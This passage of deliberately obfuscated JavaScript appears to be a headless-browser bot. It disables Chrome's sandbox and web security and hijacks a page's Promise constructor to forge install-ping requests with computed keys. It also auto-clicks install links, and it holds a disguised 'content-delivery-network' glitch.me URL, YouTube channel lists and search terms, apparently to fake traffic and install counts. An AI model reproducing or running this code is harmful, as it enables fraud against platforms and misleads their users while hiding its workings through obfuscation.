                J[0x2f * -0x9e + 0x1 * 0x1f6f + -0x25d] = this['block'], J[K >> -0x3b * -0x45 + 0x5bd * -0x1 + -0xa28] |= x[0x21d * 0xb + -0x1806 + 0xca & K], this['block'] = J[-0xc0a + -0x23cb + 0x2fe5], K >= -0xd * 0x2dd + -0xe39 + -0x1 * -0x33aa && (this['hashed'] || this['hash'](), J[0x191 * 0x5 + -0x176f + 0xf9a * 0x1] = this['block'], J[-0x2 * 0x40f + -0x1475 + 0x1ca3] = J[-0x8ef + -0xfbe + 0x18ae] = J[0x41 * 0x27 + 0x2064 + -0x2a49] = J[-0x463 * -0x7 + 0x40f * -0x1 + 0x3 * -0x8e1] = J[0xa4e + 0x79 * -0x3d + 0x128b] = J[-0x9b5 * -0x4 + -0x30 * -0x20 + -0x2ccf] = J[-0x576 + 0x2011 + -0x551 * 0x5] = J[-0x721 + 0x1b0 * -0x10 + 0x2228] = J[0x2ba + 0x1 * -0x16af + 0x1 * 0x13fd] = J[0x158f + 0x7dc + 0xeb1 * -0x2] = J[-0x562 + 0x1226 * -0x2 + 0x18 * 0x1bd] = J[0x916 + -0x1e69 + 0x155e] = J[0x1413 * 0x1 + 0x3 * 0x70b + -0x2928] = J[0x26ec * -0x1 + -0x49 * 0x2f + -0x1 * -0x3460] = J[0x3e * 0x74 + -0x2 * 0x329 + -0x15b8] = J[-0xdb9 + 0x314 + 0xab4] = -0x16f0 + -0x9b * -0x23 + 0x3 * 0x95), J[0x22ee + 0xe18 + 0xc3e * -0x4] = this['hBytes'] << 0x17c0 + -0xa38 * -0x1 + -0x1 * 0x21f5 | this['bytes'] >>> 0x1d6a + 0x79f + -0x24ec, J[0x1684 + -0x26 * -0x65 + -0x1 * 0x2573] = this['bytes'] << 0x16f * 0x19 + -0x8d6 + 0xd7f * -0x2, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = -0x1783 + 0x2325 + -0xb92; J < -0x2571 + -0x38 * -0x39 + 0x1949; ++J)
                K = Q[J - (0x25ea * -0x1 + -0xb3e * -0x3 + -0x433 * -0x1)] ^ Q[J - (-0x3 * 0x852 + -0x1d * 0x81 + 0x279b)] ^ Q[J - (0x8f2 * -0x3 + 0x76 * -0x7 + 0x1e1e)] ^ Q[J - (-0x8 * -0x160 + -0x7 * -0x11 + -0xb67)], Q[J] = K << 0x11 * -0x1bb + 0x23e5 + -0x679 | K >>> -0x630 * -0x2 + 0x40b * -0x1 + -0x2 * 0x41b;
              for (J = 0x2f * -0x3d + -0x2340 + -0x2e73 * -0x1; J < -0xfe8 + 0x11 * 0x1b1 + -0xcc5; J += 0x165 * -0x17 + -0x1b01 * -0x1 + 0x517)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x4c * -0x49 + 0x106f + -0x2616 | L >>> -0x25a8 + 0x19b2 + 0xc11 * 0x1) + (M & N | ~M & O) + P + (0x969f131 * -0xe + 0x1 * -0x52a9bedc + 0x130f76923) + Q[J] << 0x621 * -0x3 + -0x229d + -0xd4 * -0x40) << -0xb8e + 0x9ec + 0x2f * 0x9 | P >>> 0x2 * 0x356 + -0x89 * -0x13 + 0x7e * -0x22) + (L & (M = M << -0x240 + -0x44e * 0x3 + 0xf48 | M >>> -0x6a0 + 0xd27 + -0x685 * 0x1) | ~L & N) + O + (-0x110b2def + 0x48d7bf23 + 0x22b5e865) + Q[J + (0x6fd + 0x1640 + 0x1 * -0x1d3c)] << 0x9 * -0x3b4 + 0xd35 + 0x141f) << -0x5e7 + 0x224f + 0x22f * -0xd | O >>> -0x44 * -0x59 + -0x9 * 0xd5 + -0x100c) + (P & (L = L << 0x2513 + -0x21 * 0x47 + 0xde7 * -0x2 | L >>> 0x257 * -0xc + -0xc7c + 0x2892) | ~P & M) + N + (0x25469275 + 0x1edac5e3 + 0x16612141) + Q[J + (-0x233b * 0x1 + -0x1 * -0xe23 + -0x25 * -0x92)] << 0x43 * -0x8b + 0x5 * -0x232 + 0x2f5b) << 0x7 * -0x38 + -0x92d + 0xaba | N >>> -0x337 * 0x2 + 0x403 * 0x9 + -0x1d92) + (O & (P = P << -0xddd + -0x1 * 0x141 + 0xf3c | P >>> 0x1 * 0x1ee2 + 0x1726 + -0x3606) | ~O & L) + M + (-0x1 * -0x7b922bdc + 0x303ae09b + 0x514a92de * -0x1) + Q[J + (0x1407 * 0x1 + 0x62e * 0x3 + 0x1e * -0x149)] << 0x2 * 0x4fe + 0x1 * -0xfc5 + -0x5c9 * -0x1) << 0x980 * -0x2 + -0x1532 * -0x1 + 0x22d * -0x1 | M >>> 0x2165 + -0x377 * 0x1 + -0x1dd3) + (N & (O = O << 0x49 * 0x59 + -0x523 * -0x5 + 0x2 * -0x1979 | O >>> 0x47 * 0x2f + 0x1f * -0x53 + -0x2fa) | ~N & P) + L + (0xa2c3d * 0x794 + -0x51b78f2b + 0x5f22ca80) + Q[J + (-0xa6a * -0x1 + -0x1aad * -0x1 + -0x2513)] << 0x188d + 0x23d0 + -0x3c5d, N = N << -0x11df + 0x1 * -0x9e0 + -0x1 * -0x1bdd | N >>> -0xc1b * -0x3 + -0x898 + 0x5 * -0x58b;
              for (; J < 0x1583 * -0x1 + -0x1fa0 + 0x354b; J += -0x16f2 + 0x64c + 0x10ab)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x2 * -0x10c7 + -0x8b0 * -0x2 + 0x1 * -0x32e9 | L >>> -0x1ba6 + -0xd * -0x21a + 0x6f * 0x1) + (M ^ N ^ O) + P + (0x5607d * -0x1594 + -0x65151d84 + 0x147f51269) + Q[J] << 0x7 * -0x11 + -0x1ec * -0x4 + -0x739) << -0x386 + -0x611 + 0x99c | P >>> -0x1 * 0x117b + -0xc * -0x32 + 0x2 * 0x79f) + (L ^ (M = M << 0x69b + 0x251f + -0x2b9c | M >>> -0x27e + 0xa69 + -0x7e9) ^ N) + O + (0x565cc42b + 0x12 * 0x248c75b + -0x10a0dcf0) + Q[J + (-0x22d2 + 0x15a * 0x3 + 0x1ec5)] << -0x2385 + -0xfa0 + -0x3325 * -0x1) << -0x1 * -0x1007 + 0x1852 + -0xa15 * 0x4 | O >>> -0x65 * -0xd + -0x1cf8 * -0x1 + -0x21fe) + (P ^ (L = L << 0xc4a + -0xce3 + 0x1 * 0xb7 | L >>> 0x1741 + 0x1 * -0xce9 + 0x31 * -0x36) ^ M) + N + (-0x45a994 * -0x304 + 0x832327cc + -0xe65c9e7b) + Q[J + (0xd04 * 0x2 + 0x1709 + -0x310f * 0x1)] << 0xab9 + -0x244 + -0x875) << 0x1fff + 0x5 * -0x33d + 0xfc9 * -0x1 | N >>> -0x7b * 0x27 + -0x1898 + -0x1 * -0x2b70) + (O ^ (P = P << -0x151 * -0x7 + 0x1f * 0x53 + -0x56 * 0x39 | P >>> -0x1dfd + 0x108f + 0xd70) ^ L) + M + (-0x1 * -0x12600665 + 0xa9fe51d1 * -0x1 + 0x10678370d) + Q[J + (0x1 * 0x1d9e + 0x977 * 0x1 + -0x1389 * 0x2)] << -0x53b * -0x4 + 0x4f3 + 0x25 * -0xb3) << -0xac * 0x2b + -0x1c9 * 0xb + 0x308c * 0x1 | M >>> 0x222b + 0x6a * -0x59 + -0x33 * -0xe) + (N ^ (O = O << -0x18 * 0x63 + -0xa57 * 0x2 + 0x1e14 | O >>> -0xc54 + -0x9de + 0x74 * 0x31) ^ P) + L + (0x26e22ee1 * 0x4 + 0x88852f19 + -0x1 * 0xb533fefc) + Q[J + (0x10f * -0x1d + -0x1a18 + -0x38cf * -0x1)] << -0xdf8 + -0x62e + 0x2 * 0xa13, N = N << -0x155d + -0xe30 + 0x23ab | N >>> -0x137e + -0x1 * 0xaa + 0x142a;
              for (; J < 0xed9 + -0xf80 + 0xe3; J += 0x217e + -0x1046 + -0x1133)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x1 * 0x2639 + 0x229f * -0x1 + 0x48dd | L >>> -0x23d2 * -0x1 + -0x5 * -0x598 + -0x1 * 0x3faf) + (M & N | M & O | N & O) + P - (-0xa0ac905e + -0x153cbe6c * -0x6 + 0x1 * 0x92245cfa) + Q[J] << 0x49e + 0x2a * 0x56 + 0x31f * -0x6) << 0x2 * -0x2ef + 0x9 * -0xbc + 0xc7f | P >>> -0x1df * -0xa + -0x3 * 0x175 + -0xe3c) + (L & (M = M << -0x108d + 0x263b + -0x1590 | M >>> 0x1b1 * -0x11 + 0xc6d * 0x1 + 0x1056) | L & N | M & N) + O - (-0xcbd8fc26 + 0xb0908b2c + -0x6a1 * -0x15255e) + Q[J + (-0x2704 + 0x259a * -0x1 + -0xf53 * -0x5)] << -0x1e * -0x131 + -0x1c18 + -0x7a6) << -0x1780 + -0xc9f + 0x2424 | O >>> -0x3cb * 0xa + -0xd1 + -0x136d * -0x2) + (P & (L = L << -0xfb8 + -0x140b + 0x23e1 | L >>> -0xa39 * -0x1 + 0x59 * -0x10 + 0x1 * -0x4a7) | P & M | L & M) + N - (-0x1f3cbb31 + 0x25de5a3d + 0x6a42a418) + Q[J + (0x684 + 0x199b + -0x201d * 0x1)] << -0x1 * -0x897 + -0x892 + 0x1 * -0x5) << -0xfd5 + -0x1e43 + 0x2e1d | N >>> 0x2533 * 0x1 + -0x294 + -0x2284) + (O & (P = P << -0x1935 + -0x2fc * -0x6 + 0x76b | P >>> -0x2387 * -0x1 + -0x11d * 0xa + 0x1 * -0x1863) | O & L | P & L) + M - (-0x4 * -0x5c34d2f + -0x470da * -0x2dcb + 0x7184c076 * -0x1) + Q[J + (-0x26b2 + 0x1 * 0x19a6 + 0xd0f)] << -0x1719 * 0x1 + 0x1 * 0x19f2 + -0x51 * 0x9) << 0x1 * -0x20c5 + -0x13bd + 0x11 * 0x317 | M >>> 0x281 + -0x576 + 0x1c * 0x1c) + (N & (O = O << 0x20c4 * -0x1 + -0x16bb + 0x379d | O >>> 0x11 * 0x1ca + -0x5ad * 0x5 + 0x207 * -0x1) | N & P | O & P) + L - (0x13c5f * -0x8802 + 0xd09e8cba + 0x485aa728) + Q[J + (-0x8e9 + 0x2355 + -0x1a68)] << -0x1452 + 0xf45 + 0x50d, N = N << 0x1 * -0x1823 + -0x1 * 0x21c6 + 0x3a07 | N >>> -0x1dd7 * -0x1 + -0x2b1 * 0x3 + 0xae1 * -0x2;
              for (; J < -0x24e7 + 0x2507 * -0x1 + 0x4a3e; J += -0x925 * 0x3 + -0x2 * -0xe9 + 0x19a2 * 0x1)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x142f + -0x1e6f + 0xa45 | L >>> -0x83 * 0x4c + 0x1c8c + 0x1 * 0xa73) + (M ^ N ^ O) + P - (0xd849ccf * -0x3 + 0x5e97aef3 + 0x6 * -0x1219ba) + Q[J] << -0x427 + 0x12 * 0x1d2 + -0x1c9d) << 0x9b * 0x1f + 0xa3 * -0x1a + -0x232 | P >>> 0x148e + -0x20e * 0xd + 0x643) + (L ^ (M = M << 0x137d + -0x3c7 + -0xf98 | M >>> 0x516 + 0x4b1 + 0x1 * -0x9c5) ^ N) + O - (0xa * 0x2d14900 + 0x1f70913 * 0xd + -0x1b11cd) + Q[J + (0x170f + -0xd4c * -0x2 + -0x31a6)] << 0x7fb + 0x22ec + -0x2ae7) << -0x174c + 0x2006 + 0x8b5 * -0x1 | O >>> 0x12a5 + 0x1930 + 0x3a * -0xc1) + (P ^ (L = L << 0x1e3e + -0x8cc * 0x4 + 0x288 * 0x2 | L >>> -0x1190 + -0x25f9 + -0x3b * -0xf1) ^ M) + N - (0x37c5a060 + -0x4219 * -0x11588 + -0xb93f * 0x6602) + Q[J + (0x4f * -0x46 + -0x154d + 0x895 * 0x5)] << -0x1 * 0x13b5 + 0x1ea6 * 0x1 + -0xaf1) << 0xbf * 0x5 + 0x7f * 0x1 + 0x435 * -0x1 | N >>> 0x11f * 0x17 + 0xae6 + -0x2494) + (O ^ (P = P << 0x103a + 0x41b * -0x4 + 0x1 * 0x50 | P >>> 0x1 * -0x1d68 + 0x11 * 0x18 + -0x1bd2 * -0x1) ^ L) + M - (-0x1ff4775b * -0x3 + -0x217c * -0x1450c + -0x54c425b7) + Q[J + (0x3 * 0x869 + -0x8d9 + -0x3 * 0x575)] << 0xd * -0x2b1 + -0xeb * -0x1 + 0x2212) << 0x1 * -0x16ae + -0x10ab + -0x275e * -0x1 | M >>> -0x1223 + -0x1 * 0x24cb + -0x1 * -0x3709) + (N ^ (O = O << 0x66e * -0x1 + 0x1 * -0x26df + -0xb * -0x421 | O >>> 0x180f * 0x1 + -0xb * 0x137 + -0xab0) ^ P) + L - (0x21f * -0x13e3fb + -0x5d327fbe + 0xbd004f4d) + Q[J + (0x1e79 + 0x11a3 + -0x1c8 * 0x1b)] << 0x1 * 0x697 + -0x1053 + 0x2 * 0x4de, N = N << -0x1b55 * -0x1 + -0x1519 * -0x1 + -0x3050 | N >>> -0xb3c * 0x1 + 0xc1b + -0xdd;
              this['h0'] = this['h0'] + L << 0x206b + -0x2014 + -0x57, this['h1'] = this['h1'] + M << -0x48 * -0x3d + 0x1b42 + -0x2f6 * 0xf, this['h2'] = this['h2'] + N << -0x43e * 0x8 + -0x1025 + 0x3215, this['h3'] = this['h3'] + O << -0x646 + 0x1733 + 0x10ed * -0x1, this['h4'] = this['h4'] + P << -0x9e5 + -0x1 * -0xf34 + -0x54f;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> -0x215 + 0x17a7 + -0x1576 & 0xac0 + 0x361 + -0xe12] + w[J >> -0x1 * -0x1e4a + -0x2294 + -0xbb * -0x6 & -0x1 * -0x6c7 + -0x2ba * 0xc + 0x10 * 0x1a0] + w[J >> 0x78e * 0x5 + -0x3 * -0x165 + 0x29e1 * -0x1 & 0x5 * 0x65b + 0x23dd + -0x1687 * 0x3] + w[J >> 0x84b + -0x1a8e + -0x1 * -0x1253 & 0x131d + 0x25db + -0x38e9] + w[J >> 0x7 * 0x4ed + -0x1 * 0x701 + -0x1b6e & -0x7 * 0x26f + 0x12 * 0x1e7 + -0x1126 * 0x1] + w[J >> 0x1 * -0x12af + -0x1897 + -0x17 * -0x1e2 & 0x19d9 * -0x1 + 0x1 * -0x2441 + 0x3e29] + w[J >> 0x2345 + 0xe6a + -0x1 * 0x31ab & 0x1 * 0x1a88 + 0x120d + -0x29 * 0x116] + w[0x2b3 + -0xe3b * -0x1 + 0x10df * -0x1 & J] + w[K >> -0x728 + 0x178f * -0x1 + 0x1ed3 & 0x1d4c + -0x1 * 0x967 + -0x9eb * 0x2] + w[K >> -0x150b + -0x1 * -0xd2d + 0x7f6 & -0x22 * -0x42 + 0x1ae6 + -0x1 * 0x239b] + w[K >> 0x7a5 + -0x1cd8 + -0x1547 * -0x1 & -0x22 + 0x1 * -0xb6e + -0xaf * -0x11] + w[K >> -0x25da + 0x1e68 + 0x782 & -0x9d * -0x1b + -0x1abe * -0x1 + 0xa * -0x453] + w[K >> -0x20a * -0x1 + 0xd5 * -0x9 + 0x57f & 0x829 + -0xab2 * -0x1 + -0x322 * 0x6] + w[K >> -0x259 * -0x1 + 0x20ed + 0x119f * -0x2 & 0x2593 * 0x1 + 0x7 * -0x38a + 0xe9 * -0xe] + w[K >> -0xba * -0x2f + 0x1 * -0x20b5 + -0x5 * 0x49 & 0x11 * 0x3e + -0x12 * 0x20c + 0x4d * 0x6d] + w[-0x2 * -0x8fc + -0x26f * 0x6 + -0x1 * 0x34f & K] + w[L >> -0x90d + -0x472 * 0x4 + 0x16b * 0x13 & 0x3 * -0xa33 + 0x243b + -0x593] + w[L >> -0xd29 + 0x1 * 0x19f6 + 0x1 * -0xcb5 & -0x1069 * -0x1 + -0x1a * -0x119 + -0xdd * 0x34] + w[L >> -0x974 + -0x7 * 0x2ef + 0x1e11 & -0x1d08 + 0x12d0 + 0xa47 * 0x1] + w[L >> -0x1473 + -0x1 * -0xea3 + -0x1 * -0x5e0 & -0x67 * -0x1 + -0x1 * 0x207 + 0x1af * 0x1] + w[L >> -0x9bf + 0x127 + 0x13c * 0x7 & 0x1574 * -0x1 + -0x7f7 * -0x2 + 0x595] + w[L >> -0x1ca * 0xc + -0x21bc + 0x8c * 0x65 & 0xeb5 * 0x1 + -0x477 + -0xa2f] + w[L >> -0x2597 + -0x6 * 0x346 + 0x393f & -0x1524 + 0x6c0 + 0xe73] + w[0x234f + 0xbee + -0x2f2e & L] + w[M >> 0xa0e + 0x10f9 + -0x1aeb & 0x1 * 0x1c22 + -0x17f7 + -0x2 * 0x20e] + w[M >> -0x7b2 + 0x19 * -0x163 + -0x3 * -0xe27 & -0x1 * -0x2322 + 0x184b + -0x3b5e] + w[M >> 0x42e + 0x1ad5 + -0x1 * 0x1eef & 0x1843 + -0x13a2 + -0x492] + w[M >> 0xde * -0x6 + -0x4a * 0x14 + 0xb0c & 0x1dd3 + -0x1708 + -0x6bc * 0x1] + w[M >> 0x346 * 0x4 + -0x2 * 0x164 + -0xa44 & -0x1 * -0x9a3 + 0x136f + -0x1d03] + w[M >> -0x34b * -0x3 + -0x221 + -0x7b8 & 0xa42 + -0x47 * -0x2a + 0x11 * -0x149] + w[M >> 0x4 * -0x7bb + 0x13c0 + 0xb30 & -0x15b5 + -0x416 * 0x7 + 0x325e] + w[0xf61 + -0xe17 + -0x13b & M] + w[N >> -0x1f13 + -0xf42 + -0x3 * -0xf7b & 0x22ff + -0x55b * -0x1 + -0x5 * 0x80f] + w[N >> 0x14b4 + 0x11a9 * 0x1 + -0x2645 & 0x166d + 0xc1 * -0x8 + -0x1056] + w[N >> 0xccf + 0x1d * -0x124 + 0x1459 & 0x1bbb + -0x1 * 0x1fa3 + 0x3f7] + w[N >> 0x1af3 * -0x1 + 0x1 * 0x1e71 + -0x36e & -0x78 * 0x17 + -0x1 * 0x175d + 0x2234] + w[N >> -0x1 * -0x133e + -0x1eac + 0xb7a & -0x618 + -0x1af * -0x1 + -0x8 * -0x8f] + w[N >> 0xc * 0x167 + -0x1 * 0xab + -0x1021 & 0x9c * -0x8 + -0x1 * 0xc8e + -0x25 * -0x79] + w[N >> 0x7e4 + 0x21a3 * 0x1 + 0x1 * -0x2983 & 0xc34 * -0x3 + -0x846 + 0x2cf1] + w[0xb9 * 0x29 + -0x177a + -0x618 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> -0xf * 0x26f + -0x2 * -0x394 + 0x1 * 0x1d71 & 0x3a1 + 0x1528 + -0x17ca,
                J >> -0x173 + 0x1d78 + -0x1bf5 & 0xa39 * -0x1 + -0x39 * 0x9f + 0x5 * 0x953,
                J >> 0x7 * -0x2cf + 0x1b2e + -0x77d & 0xe8 * 0x28 + 0x1 * -0x2107 + 0xbe * -0x3,
                0xd * 0x8b + 0x524 + 0x2 * -0x59a & J,
                K >> -0x3 * -0x80d + 0x1 * 0x7b1 + -0x10 * 0x1fc & -0x1eb6 + 0x8 * 0xbc + 0x19d5,
                K >> 0xd * 0x11a + -0x7b2 * -0x1 + -0x15f4 & -0x66f + -0x1cd7 + -0x26b * -0xf,
                K >> 0x21 * -0x9 + 0x7f * -0x31 + 0x1980 & -0xad6 * 0x3 + -0x2423 * 0x1 + 0x45a4 * 0x1,
                0x24a1 + -0x829 * 0x3 + 0x23b * -0x5 & K,
                L >> -0x3 * 0xc91 + -0x4 * 0x6de + -0x1 * -0x4143 & -0x1 * -0x26d6 + -0x1470 + -0x1167,
                L >> -0xeb2 + 0x228e * 0x1 + -0x13cc & 0x21ec + 0x1357 * 0x1 + -0x3444,
                L >> 0x2 * 0x826 + -0x2293 + -0x124f * -0x1 & 0xad * -0x35 + 0xbb9 + 0x1917,
                -0x9 * 0x81 + -0x11ee * 0x1 + 0x5b * 0x42 & L,
                M >> 0x8e5 + -0xb * 0x14f + 0x2cc * 0x2 & 0x3 * 0x3ab + 0x1971 + -0x2373,
                M >> 0x188c + -0x1 * 0x1c37 + 0x3bb & -0x2 * 0xf66 + -0x141b + 0x33e6,
                M >> 0x228e + -0xd9 * -0x1 + -0x235f & 0x5 * 0x16 + 0x1 * -0x11ff + -0xc * -0x18c,
                -0x109f + 0x25b * -0x10 + 0x374e & M,
                N >> -0x2517 + 0x2074 + 0x4bb & -0x5a + 0x98f + -0x836,
                N >> 0x683 + 0x513 + 0xb86 * -0x1 & -0x143e + -0x1ada + 0x3b3 * 0xd,
                N >> 0x1 * 0x1e6b + -0x1fd * -0x13 + -0xda2 * 0x5 & 0x1cfd + -0x1 * 0x1919 + 0xf7 * -0x3,
                0x28b + -0x4c5 + 0x4b * 0xb & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(-0x261f + -0x1 * -0x2e4 + -0xbc5 * -0x3), (K = new DataView(J))['setUint32'](0x647 * 0x1 + -0x11 * -0x1b0 + 0x22f7 * -0x1, this['h0']), K['setUint32'](0x74f * 0x1 + -0x17 * 0xdf + 0xe9 * 0xe, this['h1']), K['setUint32'](0x1b2c + -0xd35 + -0xdef, this['h2']), K['setUint32'](0x3 * 0x47f + -0x1 * 0x2582 + 0x1 * 0x1811, this['h3']), K['setUint32'](-0x1ce3 + -0x1 * 0x11b9 + 0x2eac, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[0x251e + -0xf61 + 0x5 * -0x459];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = -0xb23 + 0x8 * 0x430 + -0x1 * 0x165d;
            J[-0x5e5 * 0x1 + 0x7 * -0x57d + 0x2c50]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[-0x2 * 0x5ec + -0x7e7 + 0x5 * 0x3f3] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), 0x1c28 + 0x1a4a + -0x3671), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = -0x4bb + 0x1 * 0x1915 + -0x1 * 0x1459;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, 0xd98 + 0xea3 + -0x53 * 0x45), Promise['resolve'](0xa3 * -0x7 + -0x1 * 0xbcf + 0x31 * 0x55);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = 0x2036 + -0x350 * -0x3 + -0x2a26; j < 0x11f6 + -0x1 * 0x5cb + -0xc2a; j++)
    i();
}
const NETWORK_PATIENCE = 0x83 * 0x6b + 0xb85 + -0x2306 + (-0x985 * 0x2 + 0x170c + 0x7b6) * Math['random'](),
  MM_NETWORK_PATIENCE = (0x1fdd + -0x1982 * -0x1 + -0x2 * 0x1cae) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + U(0x0) + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = 0x37d + 0x1c50 + -0x1fcd; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (-0x260f + 0x19dd + -0x1 * -0xc32);
    let h = e[f];
    if (c['HxAJIl'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = 0x1807 + 0x12f7 + 0x157f * -0x2, r, s, t = 0x275 + 0x460 + -0x9f * 0xb; s = m['charAt'](t++); ~s && (r = q % (-0xe1 + -0x2156 * -0x1 + -0x37 * 0x97) ? r * (0x1a87 + -0x5 * -0x209 + -0x2474) + s : s, q++ % (0x1845 + 0x2 * -0x1073 + -0x8a5 * -0x1)) ? o += String['fromCharCode'](0x118 * 0x5 + 0xba7 + -0x10 * 0x102 & r >> (-(-0x894 + 0x1 * -0x1acd + -0x2363 * -0x1) * q & 0x8d9 + 0x167 * -0x5 + -0x1d0)) : -0x4a1 + 0x78a + -0x2e9 * 0x1) {
          s = n['indexOf'](s);
        }
        for (let u = -0x88b + 0x2 * 0xae7 + -0xd43, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](0x153 * -0xc + -0x12c5 + -0x1 * -0x22b9))['slice'](-(0x1e0 + 0x2dd * -0x2 + -0x34 * -0x13));
        }
        return decodeURIComponent(p);
      };
      c['YmhRrP'] = i, b = arguments, c['HxAJIl'] = !![];
    }
    const j = e[0x1302 + -0xb1d + -0x7e5],
      k = f + j,
      l = b[k];
    return !l ? (h = c['YmhRrP'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
let searchTerms = [];
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 